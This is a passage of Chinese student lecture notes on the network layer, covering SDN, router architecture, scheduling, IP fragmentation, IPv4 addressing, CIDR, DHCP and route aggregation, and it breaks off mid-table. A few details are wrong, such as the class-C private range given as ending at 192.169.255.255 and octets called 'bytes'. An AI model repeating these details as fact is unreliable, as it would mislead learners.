<li>一个分组到达路由器，会先进行解封装，然后得到segment，从中取出目标IP地址与路由表的表项做对比，从匹配的对应表项指示的输出链路转发。</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604214652.png" /></p>
<p>从上面的分析中可以得到一个比较奇怪的现象，那就是路由是控制平面的功能，路由表是路由功能的结果，按道理来说应该属于控制平面。但是转发却需要依赖路由表来进行转发，这么一看路由表又属于数据平面。因此，<strong>传统的方法的数据平面和控制平面通过路由表紧耦合</strong>。</p>
<p>并且也可以看出，无论是控制平面还是数据平面，功能的实现都是分布式的。每个路由器都会计算出路由表然后交给数据平面使用。每个路由器根据路由表进行转发。</p>
<p>紧耦合和分布式会导致路由器不好作修改。你想想，如果需要修改控制平面的功能，需要把整个路由器给换了，这就是紧耦合带来的弊端。即使有那个技术和经济把路由器换了，全球这么多路由器，不能够全部都换了吧，这不是经济和技术能做到的。因此，就出现了新的方法——SDN。</p>
<h3 id="sdn方法">1.4.2. SDN方法</h3>
<p><strong>SDN：Software-Defined Networking 软件定义网络</strong></p>
<p><strong>它与传统方法的最大区别是：该方法下拥有一个不同的远程控制器与本地控制代理交互。其中本地控制代理属于数据平面，而远程控制器属于控制平面。并且，所有路由器的控制平面集中在一个远程数据中心</strong></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604215603.png" /></p>
<p>这种方法的工作流程是：</p>
<ol type="1">
<li>远程控制器计算出当前网络中的流表，然后将其通过<strong>南向接口</strong>交给网络中的所有“路由器”；</li>
<li>分组到达“路由器”之后，与传统方法一样，根据流表进行匹配，然后根据匹配的表项<strong>动作</strong></li>
</ol>
<p>此时路由器不再称之为路由器，而是<strong>分组交换机</strong>。因为它已经失去了路由或者说控制平面的功能了。于此同时，它还多了其他数据平面的功能：<strong>泛洪</strong>、<strong>阻止(block)</strong>、<strong>修改</strong>。</p>
<p>这种方法下，匹配也和传统方法不一样。传统方法只匹配目标IP地址，而SDN不止匹配目标IP地址，可能还会匹配目标端口，协议这些字段。</p>
<p>工作流程中第2步的<strong>动作</strong>包括：转发、泛洪、阻止和修改（某些字段）。</p>
<p>这种方法的好处有：</p>
<ol type="1">
<li>数据平面和控制平面解耦合，比较好修改。</li>
<li>计算流表并于分组交换机交互是通过软件实现的。</li>
<li>远程控制器上面运行着网络操作系统，在这之上运行着许多网络应用（不是应用层的应用），比如说路由、防火墙、RDS（Route
Detection System）等复杂网络功能。</li>
<li>控制平面的功能实现是集中的</li>
</ol>
<p>总结来说，分组交换机对到来的分组的动作可以通过远程控制器来指定，而远程控制器可以通过人为的编程来实现某些功能。</p>
<h2 id="连接建立">1.5. 连接建立</h2>
<p>连接建立是某些网络服务模型（网络架构）的重要功能：ATM，frame relay,
X.25</p>
<p>在分组传输之前，在两个主机之间，在通过一些路由器所构成的路径上建立一个网络层连接。</p>
<p>网络层和传输层连接服务的区别：</p>
<ul>
<li><strong>网络层</strong>：<strong>有连接</strong>。在2个主机之间，涉及到路径上的一些路由器。（包括主机和路由器在内都会记住这个连接状态）</li>
<li><strong>传输层</strong>：<strong>面向连接</strong>。在2个进程之间，只体现在端系统之上。（比如TCP连接。只有通信双方主机知道两者有连接，中间的路由器都不知道）</li>
</ul>
<h2 id="网络服务模型">1.6. 网络服务模型</h2>
<p>衡量网络服务模型的几个标准：</p>
<ol type="1">
<li>保证带宽</li>
<li>保证不丢失</li>
<li>保证不乱序</li>
<li>保证时延</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604221052.png" /></p>
<p>其中，这四个都没有保证的网络服务模型称之为 <strong>best
effor，也就是尽力而为</strong>。</p>
<h1 id="路由器组成">2. 路由器组成</h1>
<h2 id="路由器结构">2.1. 路由器结构</h2>
<p>通用路由器体系架构（传统）：</p>
<ul>
<li>路由：运行路由选择算法/协议(RIP, OSPF, BGP)生成路由表</li>
<li>转发：将数据报从输入链路接收，然后根据路由表选择合适的输出链路发送</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605083113.png" /></p>
<h2 id="输入端口">2.2. 输入端口</h2>
<p>输入端口的功能如下图：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605083131.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604231036.png" /></p>
<p>SDN使用的就是通用转发。</p>
<h3 id="基于目标的转发">2.2.1. 基于目标的转发</h3>
<p><strong>原理：匹配IP数据报中的目标IP地址(Destination Address,
DA)和路由表中的表项，从而决定输出链路。</strong></p>
<table>
<colgroup>
<col style="width: 84%" />
<col style="width: 15%" />
</colgroup>
<thead>
<tr class="header">
<th>DA范围</th>
<th>Link interface</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>11001000 00010111 00010000 00000000 ~ <br>11001000 00010111 00010111
11111111</td>
<td>0</td>
</tr>
<tr class="even">
<td>11001000 00010111 00011000 00000000 ~ <br> 11001000 00010111
00011000 11111111</td>
<td>1</td>
</tr>
<tr class="odd">
<td>11001000 00010111 00011001 00000000 ~ <br> 11001000 00010111
00011001 11111111</td>
<td>2</td>
</tr>
<tr class="even">
<td>otherwise</td>
<td>3</td>
</tr>
</tbody>
</table>
<p>如果DA范围并没有像上表中划分的那么规整该怎么办？使用<strong>最长前缀匹配</strong>。</p>
<blockquote>
<p>在IP协议的时候会细说</p>
</blockquote>
<table>
<thead>
<tr class="header">
<th>DA范围</th>
<th>Link interface</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>11001000 00010111 00010*** ********</code></td>
<td>0</td>
</tr>
<tr class="even">
<td><code>11001000 00010111 00011000 ********</code></td>
<td>1</td>
</tr>
<tr class="odd">
<td><code>11001000 00010111 00011*** ********</code></td>
<td>2</td>
</tr>
<tr class="even">
<td>otherwise</td>
<td>3</td>
</tr>
</tbody>
</table>
<p>此时，来了两个DA：</p>
<ul>
<li><code>11001000 00010111 00010110 10100001</code></li>
<li><code>11001000 00010111 00011000 10101010</code></li>
</ul>
<p>前者匹配第一个表项，因此从0接口转发；后者匹配第二个表现，因此从1接口转发。</p>
<h3 id="输入端口缓存">2.2.2. 输入端口缓存</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605081821.png" /></p>
<ul>
<li>当switch
fabric（交换机构）的速率小于输入端口的汇聚速率时，在输入端口可能就需要排队了。其实这种情况不太会发生，更多的情况是如上图中的左边，两个红色的同时在队头，因为两个红的输出端口一致，所以需要等待其中一个处理完成之后，才处理另一个，这时候等待的那个队列就可能来新的分组，这时候就需要队列了。</li>
<li>Head-of-the-line(HOL)
blocking：排在队头的数据报阻止了队列中其他数据报向前移动</li>
</ul>
<blockquote>
<p>交换机构一般都是由硬件实现的，因为这里要交的速率比较快，软件达不到速率。一般来说如果每个端口的输入速率为v，有N个端口，那么交换机构的交换速率大致为Nv。</p>
</blockquote>
<ul>
<li>输入端口缓存满，则会丢弃后面到来的分组。</li>
<li>缓存太大虽然不会丢失，但是会超时</li>
</ul>
<h2 id="交换结构">2.3. 交换结构</h2>
<p>交换结构位于一台路由器的核心部位，因为这是通过这种交换结构，分组才能实际从一个输入端口到达一个输出端口：</p>
<ul>
<li><p>将分组从输入缓冲区交换到合适的输出端口</p></li>
<li><p>交换速率：分组可以按照该速率从输入传输到输出</p>
<ul>
<li>运行速度一般是输入/输出链路速率的若干倍</li>
<li>N个输入，交换结构的交换速率是N倍的输入比较理想，这样才不会成为瓶颈</li>
</ul></li>
<li><p>有三种典型的交换结构</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605083517.png" /></p></li>
</ul>
<h3 id="通过内存交换">2.3.1. 通过内存交换</h3>
<p>第一代路由器：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605083608.png" /></p>
<ul>
<li>在CPU控制下交换</li>
<li>分组首先被拷贝到系统内存中，CPU从分组中提取目标IP，查路由表，找到对应的输出端口，再将其从内存中拷贝到输出端口。</li>
<li>转发速率被内存的带宽限制。分组一共经过两次（计算机内部）系统总线</li>
<li>一次只能转发一个分组（CPU一次只能执行一个工作）</li>
</ul>
<h3 id="通过总线交换">2.3.2. 通过总线交换</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605083942.png" /></p>
<ul>
<li>分组通过共享总线，从输入端口转发到输出端口</li>
<li><strong>总线竞争</strong>：交换速度受限于总线带宽</li>
<li>一次处理一个分组（只能一个分组通过总线）</li>
<li>速度比内存快。只需要经过一次总线</li>
</ul>
<h3 id="通过互联网络crossbar等交换">2.3.3.
通过互联网络(crossbar等)交换</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605084245.png" /></p>
<ul>
<li>可以并发转发多个分组，克服总线带宽限制</li>
<li>分组从端口A到达，转发给Y，控制器只需要短接响应的两个总线（上面最中间那个点）。此时如果B端口要转发到Z，只需要再短接第二层右边的点即可。</li>
<li><strong>高级设计</strong>：将数据报分片为固定长度的信元，通过互联网络交换</li>
</ul>
<h2 id="输出端口">2.4. 输出端口</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605084544.png" /></p>
<ul>
<li>交换机构转发数据报的速度比传输速率快，所以输出的端口需要有缓存</li>
<li>与输入端口不一样，这里的数据报传输是存在不同的<strong>调度规则</strong>的。</li>
<li>输出缓存满，则会丢弃数据报（这里可能不是丢弃后面到来的，有相应的丢弃策略）</li>
<li>缓存太大虽然不会丢失，但是会超时</li>
</ul>
<h3 id="调度机制">2.4.1. 调度机制</h3>
<p><strong>调度：从输出缓存中选择下一个要通过链路传输的分组。</strong></p>
<p>调度规则这里介绍4种：</p>
<ol type="1">
<li>FIFO(first in first out)scheduling</li>
<li>优先权调度</li>
<li>RR(Round Robin)scheduling</li>
<li>WFQ(Weighted Fair Queuing)</li>
</ol>
<p>FIFO比较好理解，就是先来后到。先来的分组先传输，后来的分组后传输。</p>
<p>优先权：这也比较好理解，比如可以将分组设置类别：video，voice，text等。包含视频数据分组优先权大于包含语音分组的优先权大于只包含文字的优先权。这样子，如果队列中同时存在video，voice和text，那么根据调度规则，优先传输video，然后voice，最后text，即使video排在比较后面。这种情况，需要在头部中标记分组类型。</p>
<p>RR：也是将分组分成多个类别（假设三个类别分别为红黄蓝）。那么传输的顺序就是：<code>红-&gt;黄-&gt;蓝-&gt;红-&gt;黄-&gt;蓝...</code>。如果某种类别的分组没了，则跳过。</p>
<p>WFQ：加权公平，也是将分组分类（假设三个类别分别为红黄蓝，并且红的权重为0.5，蓝为0.3，黄为0.2）。那么在一段时间内，不同类别的服务占据传输链路带宽的比重（或者说服务时间）应该与它的权重占整体权重的比重相一致。</p>
<p>假设这段时间为T，某红色类别分组得到的服务时间为t，红色类别权重为<span
class="math inline">\(w_r\)</span>，黄色为<span
class="math inline">\(w_y\)</span>，蓝色为<span
class="math inline">\(w_b\)</span>，那么：</p>
<p><span class="math display">\[
t=\frac {w_r}{w_r+w_y+w_b} * T
\]</span></p>
<p>这种调度规则不会精确到某一时刻，而是衡量一段时间内。这样子，能够保证在最坏的情况下，所有类别的分组都能够有一定的服务时间。</p>
<h3 id="丢弃策略">2.4.2. 丢弃策略</h3>
<p>有调度机制，自然也有丢弃策略。丢弃策略比较简单，常见的就以下三种，当输出缓冲满的时候：</p>
<ol type="1">
<li>tail drop：丢弃后到来的分组</li>
<li>priority：丢弃缓冲中优先权最低的分组</li>
<li>randon：随机从缓冲中丢弃分组</li>
</ol>
<p>其中，priority会导致“饥饿”。就是如果一直存在高优先权的分组，那么低优先权的分组就会被一直丢弃。使得低优先权分组永远得不到服务。调度机制中的优先权也存在这个问题。</p>
<h1 id="ip-internet-protocol">3. ⭐IP: Internet Protocol</h1>
<p>主机、路由器中的网络层功能：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605093143.png" /></p>
<p>从上图中也可以看出，网络层不只有IP协议，还有路由协议以及ICMP协议（信令协议，主要作用是报告错误）</p>
<p>IP数据报格式：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605093234.png" /></p>
<p><strong>Internet checksum：IP头部校验和</strong></p>
<p>一般来说，IP数据报头部占20Bytes，如果有Options那另说。</p>
<p>IP数据报传递到数据链路层，被封装成帧。一个帧的MTU为1500，也就是帧的body部分为1500Bytes。一般而言，IP数据报
= 帧的body = MTU。</p>
<h2 id="ip分片和重组fragmentationreassembly">3.1.
IP分片和重组(fragmentation&amp;reassembly)</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605093507.png" /></p>
<p>如上图，两个路由器连接的是两个网络，这两个网络可能不同架构，因此就会存在不同的MTU。一个路由器假设左端是A网络，MTU为4000Byte，右边是以太网，MTU为1500Byte。那么从左端收到的数据报就应该被分片，才能转发到右边的网络。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605094835.png" /></p>
<p>其中，左边的数据报为：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605094910.png" /></p>
<p>右边三个从上到下分别为：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605094948.png" /></p>
<blockquote>
<p>上面的演示只涉及网络层，不涉及数据链路层的头部，因此分片中的1500指的是整个IP数据报的长度</p>
</blockquote>
<p>因此，IP分片中每个数据报：</p>
<ul>
<li><strong>具有相同的ID</strong>：说明是来自同一个大的数据报的分片。不仅分片之间ID相同，分片与原数据报的ID也相同</li>
<li><strong>不同的偏移量</strong>：说明每个数据报在原数据报中的顺序。以字节为单位</li>
<li><strong>最后一个分片标记为0</strong>：说明该分片是最后一个</li>
<li>分片不是将整个数据报进行分片，而是将数据报中的<strong>数据部分</strong>进行分片</li>
</ul>
<p>以上描述的是分片的过程。重组只在目标主机上进行。如果目标主机收到分片中的任何一片（通过fragflag判断）就会启动一个定时器，如果在定时器结束之前，所有的分片到来，就会关闭定时器，将分片重组（通过offset和ID）往上传。如果定时器结束之前，有一片或者多片没有到来，会将已经到来的分片也丢弃。</p>
<h2 id="ipv4地址">3.2. IPv4地址</h2>
<p>我们常说的IP地址，其实值得就是IPv4地址。</p>
<p><strong>IP地址</strong>：32位标示，对<strong>主机</strong>或者<strong>路由器</strong>的<strong>接口</strong>编址</p>
<p><strong>接口</strong>：主机/路由器和物理链路的连接处</p>
<ul>
<li>路由器通常拥有多个接口（2个及以上）。因为路由连接至少两个子网</li>
<li>主机也有可能有多个接口。可以插多张网卡，接入多个子网</li>
<li><strong>一个IP地址和一个接口关联</strong></li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605103414.png" /></p>
<p>从上图中可以看出：</p>
<ul>
<li>路由器一般通过交换机连接一个子网中的所有主机</li>
<li>如果是Wi-Fi，则路由器通过AP连接一个子网中的所有主机</li>
<li>223.1.1.1是<strong>点分十进制记法</strong>，每8个字节转为10进制，然后用
<code>.</code> 隔开</li>
</ul>
<p><strong>其实路由器和路由器直接的连接通常都是直连。</strong></p>
<h3 id="子网subnets">3.2.1. 子网(subnets)</h3>
<p>上面说，路由器将至少两个子网连在一起。那么子网是什么呢？</p>
<p>IP地址：</p>
<ul>
<li>子网部分（高位bits）</li>
<li>主机部分（地位bits）</li>
</ul>
<p>什么是子网，需要满足以下两个条件：</p>
<ul>
<li>一个子网内的节点（主机或者路由器）它们的IP地址的高位部分相同，这些节点构成的网络</li>
<li>同一子网内，各主机之间的通信<strong>不需要借助路由器</strong>，可能能够直达，或者借助交换机。</li>
</ul>
<p><strong>一般来说，我们直接称子网为网络。</strong></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605104217.png" /></p>
<p>比如上图中就具有3个子网。但是换一个角度想，这三个子网的高位部分（高16位）其实也相同，那么这个网络也可以看成一个子网
<code>223.1.0.0/16</code>
，这个子网内的主机通信可能会借助路由器。这个现象称为<strong>地址聚合/路由聚合/路由摘要</strong>，那么与该路由器相连的路由器里面可能就会有一个表项：<code>223.1.0.0 interface1</code>
，意思是可以通过接口1到达223.1.0.0这个网络。</p>
<p>接下来做一个题，下图中有几个子网？</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605104609.png" /></p>
<p>3？6？答案是6。子网其实看的是接口，除了有主机的三个子网之外，路由器之间的链路也是一个子网，因为该链路</p>
<ul>
<li>两端各有一个接口，并且高位相同；</li>
<li>这两个接口的通信不需要经过路由器</li>
</ul>
<p>因此，三个链路也是子网。所以最后答案是6。</p>
<h3 id="ip地址分类">3.2.2. IP地址分类</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605113011.png" /></p>
<p>解释：</p>
<ul>
<li>A类：高8位为网络号，且第1位为0。因此有 <span
class="math inline">\(2^7=128\)</span> 个A类网络，每个A类网络有<span
class="math inline">\(2^{24}-2\)</span> 个主机。</li>
<li>B类：高16位为网络号，且前2位为10。因此有 <span
class="math inline">\(2^{14}=16384\)</span>个B类网络，每个B类网络有
<span class="math inline">\(2^{16}-2=65534\)</span> 个主机</li>
<li>C类：高24位为网络号，且前三位为110。因此有 <span
class="math inline">\(2^{21}\)</span> 个C类网络，每个C类网络有 <span
class="math inline">\(2^8-2=254\)</span> 个主机</li>
</ul>
<p>除了上面的分类之外，还存在一些特殊的IP地址：</p>
<ul>
<li><p>网络号和主机号全0，表示该网络上的所有主机，可以做源端，不可以做目的端（DHCP时使用）</p></li>
<li><p>网络号全0，主机号为HostID，表示该网络是特定的主机</p></li>
<li><p>127.x.x.x
表示环回地址，工作原理：数据到达网络层之后又转回去了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605114622.png" /></p></li>
<li><p>网络号和主机号全1，表示在该网络上广播</p></li>
<li><p>网络号为netID，主机号全1.表示在特定网络广播</p></li>
</ul>
<p>除了这些特殊IP之外，还设有专用地址：</p>
<ul>
<li>这些地址永远不会被当作共用地址来分配，不会与共用地址重复
<ul>
<li>只在局部网络中有意义，用于区分不同的设备</li>
</ul></li>
<li>路由器不会对目标地址是专用网络的分组进行转发</li>
<li>专用地址范围：
<ul>
<li>A类: <code>10.0.0.0 ~ 10.255.255.255</code></li>
<li>B类：<code>172.16.0.0 ~ 172.31.255.255</code></li>
<li>C类：<code>192.168.0.0 ~ 192.169.255.255</code></li>
</ul></li>
</ul>
<h3 id="cidr">3.2.3. CIDR</h3>
<p>这么分类其实有一个很大的弊端，A类网络很少，但是每个网络可以拥有非常多的主机不适用。C类网络虽然很多，但是每个C类网络的主机只有254，太少了，稍微大一点的企业就超过了。综合来看，B类是最合适的，但是B类网络的主机数也有一点多，一般来说用不完。</p>
<p>这样子就会造成浪费。一个企业拥有1000台主机该怎么办？办一个B类，太大；办4个C类，企业间主机通信都要通向外网。</p>
<p>为了解决这个分配不当的问题，CIDR(Classless InterDomain
Routing，无类域间路由)出现了。</p>
<ul>
<li>子网部分可以在任何位置切开</li>
<li>地址格式：a.b.c.d/x，其中x是地址中子网的长度。</li>
</ul>
<p>举个例子：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605120955.png" /></p>
<p>上图中的子网部分就是23位，主机部分9位。这不是A，B，C中的任何一类。</p>
<p>CIDR的出现，企业可以根据主机数决定子网部分的位数。比如上面提到的1000台主机，就可以让子网部分占22位，主机部分占10位，<span
class="math inline">\(2^{10}=1024\)</span>
除去全0和全1，正好能够满足要求。</p>
<h3 id="子网掩码mask">3.2.4. 子网掩码(mask)</h3>
<p>需要明确一点，路由器的功能是<strong>连接两个子网</strong>。也就是说路由器是根据分组中的目标IP地址中的网络号来区分两个不同的子网，因此主机号对于路由器是没有用的。</p>
<ul>
<li>192.168.10.124/24</li>
<li>192.168.10.100/24</li>
</ul>
<p>上面两个地址属于同一个网络
192.168.10.0/24，路由器根据前24位（网络号）就可以判断，不需要最后的主机号。</p>
<p>子网掩码：</p>
<ul>
<li>子网部分用全1表示</li>
<li>主机部分用全0表示</li>
<li>32位</li>
</ul>
<p>不同类网络的子网掩码分别是：</p>
<ul>
<li>A类：255.0.0.0</li>
<li>B类：255.255.0.0</li>
<li>C类：255.255.255.0</li>
</ul>
<p>CIDR下的子网掩码例子：</p>
<ul>
<li>11111111 11111111 11111100 00000000</li>
</ul>
<p>还有一种表示方法就是：a.b.c.d/x。后面的x就表示子网的部分。</p>
<p>结论： <span class="math display">\[
子网 = IP \&amp;\&amp; 子网掩码
\]</span></p>
<blockquote>
<p>&amp;&amp;: 按位与</p>
</blockquote>
<p>这个公式在转发算法中使用。</p>
<h3 id="转发表和转发算法">3.2.5. 转发表和转发算法</h3>
<p>转发表如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605121532.png" /></p>
<p>其中 next hop
是用来指示从对应接口出去之后会到达的路由器的接口的IP地址，通过IP地址就能够知道下一跳路由器的MAC地址也就是下一跳目标MAC地址，这是数据链路层中封装时需要使用的。每过一条都要修改源MAC地址和目标MAC地址。</p>
<p>转发算法：</p>
<ol type="1">
<li>获得IP数据报中的目标IP地址(IP Des addr)</li>
<li>对于转发表中的每一个表项：
<ul>
<li>如果 <span class="math inline">\((IP　Des　addr) \&amp;\&amp; (Mask)
== Destination　Subnet　Num\)</span>，则按照表项对应的接口转发</li>
<li>如果没有找到，则使用默认表项转发数据报</li>
</ul></li>
</ol>
<h3 id="获得一个ip地址">3.2.6. 获得一个IP地址</h3>
<p>有两个办法：</p>
<ol type="1">
<li>通过修改本地的配置文件</li>
<li>利用DHCP(Dynamic Host Configuration
Protocol)，从服务器中动态获得一个IP地址</li>
</ol>
<h4 id="dhcp">3.2.6.1. DHCP</h4>
<p>目标：允许主机在加入网络的时候，动态的从DHCP服务器那里获得IP地址</p>
<ul>
<li>可以更新对主机在用IP地址的租用期（每个主机获得的IP地址是有租用期的，过期要么续租要么收回）</li>
<li>重新启动时，允许重新使用以前用过的IP地址（除非有新的机器占用了）</li>
<li>支持移动用户加入网络</li>
<li>一个C类的只允许254台主机，但是使用DHCP可以支持更多的用户。假设有400人，400人同时上网的可能性也不大，有可能200人早上，200人晚上用。因此可以同时支持这400人</li>
<li>比起手动配置方便太多了</li>
</ul>
<p>工作概况：</p>
<ol type="1">
<li>主机广播 “DHCP discover” 报文</li>
<li>DHCP服务器用 “DHCP offer” 提供报文响应</li>
<li>主机请求IP地址：发送 “DHCP request” 报文</li>
<li>DHCP服务器发送地址：“DHCP ack”报文</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605144833.png" /></p>
<ol type="1">
<li>DHCP discover：我需要一个IP地址</li>
<li>DHCP offer：这个IP怎么样？并带上一个IP地址</li>
<li>DHCP request：可以，就它了</li>
<li>DHCP ack：OK，这个IP借给你，3600s之后要么续租，要么收回</li>
</ol>
<p>解释：</p>
<ul>
<li>最开始的时候，主机没有IP地址，故使用全0。刚开始的时候不知道DHCP服务器的IP地址，故使用全1的广播地址。</li>
<li>DHCP收到之后给出IP之后其实已经结束了，为什么还需要后面的两步？因为可能主机收到了不止一个DHCP服务器的响应，因此主机需要明确的告诉DHCP服务器自己的选择。</li>
</ul>
<p>这里指示演示了DHCP的工作流程，DHCP返回的不仅仅是IP地址，而是之前说过的主机上网需要4个值：</p>
<ol type="1">
<li>IP地址</li>
<li>第一跳路由器的IP地址（默认网关）</li>
<li>本地DNS服务器的域名和IP地址</li>
<li>子网掩码</li>
</ol>
<h3 id="获得地址块以及路由聚合">3.2.7. 获得地址块以及路由聚合</h3>
<h4 id="换的地址块">3.2.7.1. 换的地址块</h4>
<p>主机可以从DHCP服务器中获得一个IP地址，那么DCHP是如何获得这么多IP地址的呢？</p>
<p>首先，有几个机构用来管理大的地址快：ICANN(Internet Corporation for
Assigned)</p>
<ul>
<li>分配地址</li>
<li>管理DNS</li>
<li>分配域名，解决冲突</li>
</ul>
<p>ISP从ICANN获得一整个地址块，假设为
<code>200.23.16.0/20</code>。然后将这一大块地址分为多个小块，比方说分成8块：</p>
<ul>
<li>ISP: <strong>11001000 00010111 0001</strong>0000 00000000
200.23.16.0/20</li>
<li>机构0: <strong>11001000 00010111 0001000</strong>0 00000000
200.23.16.0/23</li>
<li>机构1: <strong>11001000 00010111 0001001</strong>0 00000000
200.23.18.0/23</li>
<li>机构2: <strong>11001000 00010111 0001010</strong>0 00000000
200.23.20.0/23</li>
<li>机构3: <strong>11001000 00010111 0001011</strong>0 00000000
200.23.22.0/23</li>
<li>机构4: <strong>11001000 00010111 0001100</strong>0 00000000
200.23.24.0/23</li>
<li>机构5: <strong>11001000 00010111 0001101</strong>0 00000000
200.23.26.0/23</li>
<li>机构6: <strong>11001000 00010111 0001110</strong>0 00000000
200.23.28.0/23</li>
<li>机构7: <strong>11001000 00010111 0001111</strong>0 00000000
200.23.30.0/23</li>
</ul>
<p>将这8块就可以分给不同的机构，不同的机构可以将这个网络给DHCP服务器，让其动态分配。或者也可以再将其分成更小的地址块。</p>
<h4 id="路由聚合">3.2.7.2. 路由聚合</h4>
<p>假设机构获得200.23.16.0/20，根据上面的分析，将200.23.18.0/23分配给部门1，将200.23.20.0/23分给部门2。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605154637.png" /></p>
<p>（假设机构路由器上面的接口为lan0，下面的接口为lan1；机构路由器左边的接口为lan3）</p>
<ol type="1">
<li>接下来部门1，2路由器告诉机构路由器（<strong>路由通告</strong>），“如果有对应网络号的数据就转发给我”，机构的路由表里面就存在这样两项：</li>
</ol>
<table>
<thead>
<tr class="header">
<th>DA</th>
<th>mask</th>
<th>next hop</th>
<th>Inf</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>200.23.18.0</td>
<td>23</td>
<td>IPx</td>
<td>lan0</td>
</tr>
<tr class="even">
<td>200.23.20.0</td>
<td>23</td>
<td>IPy</td>
<td>lan1</td>
</tr>
<tr class="odd">
<td>...</td>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<ol start="2" type="1">
<li>机构路由器收集这些信息之后告诉ISP“如果遇到这两个网络的数据就转发给我”，那么ISP的路由表中也会存在上表中的两项，只不过有一些区别：</li>
</ol>
<table>
<thead>
<tr class="header">
<th>DA</th>
<th>mask</th>
<th>next hop</th>
<th>Inf</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>200.23.18.0</td>
<td>23</td>
<td>IPc</td>
<td>lan3</td>
</tr>
<tr class="even">
<td>200.23.20.0</td>
<td>23</td>
<td>IPc</td>
<td>lan3</td>
</tr>
<tr class="odd">
<td>...</td>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<p>这时候只有两个，看过去问题不到，如果8个全部给出去了，那么就会出现9个表项，除了DA不一样，其他全都一样。并且ISP还会告诉Internet中与它直连的路由器这些信息。这样就会导致互联网中的分组如果DA为上面8个之一，只需要转发到同一个路由器（ISP）即可，因此其实只需要一个表项。<strong>这就是路由聚合存在的必要</strong>。</p>
<p>使用路由聚合的情况：</p>
<p>机构路由表不变。但是ISP路由表变成如下：</p>
<table>
<thead>
<tr class="header">
<th>DA</th>
<th>mask</th>
<th>next hop</th>
<th>Inf</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>200.23.16.0</td>
<td>20</td>
<td>IPc</td>
<td>lan3</td>
</tr>
<tr class="even">
<td>...</td>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<p>这1条信息可以包含之前的8条消息。再把这条信息告诉Internet中直连的路由器，这样网络中的信息就会从8条变成1条。网络中遇到这个网络的分组就可以分给ISP，然后ISP给机构，机构中保留有原来的8个就可以找到对应的组织。</p>
<ul>
<li>资源占用少</li>
<li>计算简单</li>
</ul>
<p>如果出现下面这种情况：(路由表中的next hop
Inf不要在乎是什么，只要在乎一不一样)</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605160228.png" /></p>
<p>那么机构路由表为：</p>
<table>
<thead>
<tr class="header">
<th>DA</th>
<th>mask</th>
<th>next hop</th>
<th>Inf</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>200.23.18.0</td>
<td>23</td>
<td>IPa</td>
<td>lan1</td>
</tr>
<tr class="even">
<td>200.23.20.0</td>
<td>23</td>
<td>IPb</td>
<td>lan2</td>
</tr>
<tr class="odd">
<td>200.23.22.0</td>
<td>23</td>
<td>IPc</td>
<td>lan3</td>
</tr>
<tr class="even">
<td>200.23.24.0</td>
<td>23</td>
<td>IPd</td>
<td>lan4</td>
</tr>
<tr class="odd">
<td>200.23.26.0</td>
<td>23</td>
<td>IPe</td>
<td>lan5</td>
</tr>
<tr class="even">
<td>200.23.28.0</td>
<td>23</td>
<td>IPf</td>
<td>lan6</td>
</tr>
<tr class="odd">
<td>...</td>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<p>那么机构会怎么将信息给ISP呢？答案还是聚合成一条给ISP。并且部门8也会给ISP一条信息，因此ISP路由表如下</p>
<table>
<thead>
<tr class="header">
<th>DA</th>
<th>mask</th>
<th>next hop</th>
<th>Inf</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>200.23.16.0</td>
<td>20</td>
<td>IPg</td>
<td>lan3</td>
</tr>
<tr class="even">
<td>200.23.30.0</td>
<td>23</td>
<td>IPk</td>
<td>lan4</td>
</tr>
<tr class="odd">
